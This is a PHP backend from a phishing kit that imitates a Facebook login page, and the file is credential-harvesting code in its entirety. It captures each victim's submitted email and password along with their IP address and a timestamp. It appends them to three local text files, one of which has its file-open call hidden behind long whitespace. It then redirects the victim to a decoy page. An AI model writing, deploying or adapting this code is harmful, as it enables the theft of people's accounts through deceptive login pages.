<?php




if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n";
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n";
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR'] ;
    }

$LOGIN = $_POST ['email'];
$SENHA = $_POST ['pass'];
$datahora = date('d/m/Y \à\s H:i:s');
$browser = $_SERVER['HTTP_USER_AGENT'];



$COifconfig = "\n----------------------------------------
| 1 Facebook | $datahora 
IP: $ipaddress 
ACCOUNT: $LOGIN
PASSWORD: $SENHA   ";

$ARQUIVO2="client.txt";    
$ABRIR2 = fopen ($ARQUIVO2, "a") ;                                                                                               
fwrite ($ABRIR2, $COifconfig) ;
fclose ($ABRIR2) ;









$CONTEUDO =  "\n---------------------------------------
| 1 Facebook | $datahora 
ACCOUNT $LOGIN
";
$ARQUIVO = "slavik2.txt" ;  
$ABRIR = fopen ($ARQUIVO, "a") ;
fwrite ($ABRIR, $CONTEUDO) ;
fclose ($ABRIR) ;  








$CLIENT=  "\n----------------------------------------
| 1 Facebook | $datahora 
ACCOUNT: $LOGIN
PASSWORD: $SENHA ";                                                                                                                                                  $ABRIR = fopen ($ARQUIVO, "a") ;

$CLIENTfile= "wft.txt" ;     
$openfile = fopen ($CLIENTfile, "a") ;
fwrite ($openfile, $CLIENT) ;
fclose ($openfile) ;  










 if(! preg_match("#^[\w.-]+@[\w.-]+\.[a-zA-Z]{2,6}$#",$LOGIN)   && ! is_numeric($_POST['email'] ) || ! preg_match('/^[\w$@]{6,}$/', $SENHA)   ){
      header("Location: facebebookwaysdemozphotos54003583611888285850452760534.html"); exit;
  }


echo '<Meta http-equiv="refresh" content="0;url=facebebookwaysdemozphotos54003583611888285850452760534.html">' ;
exit;
?>
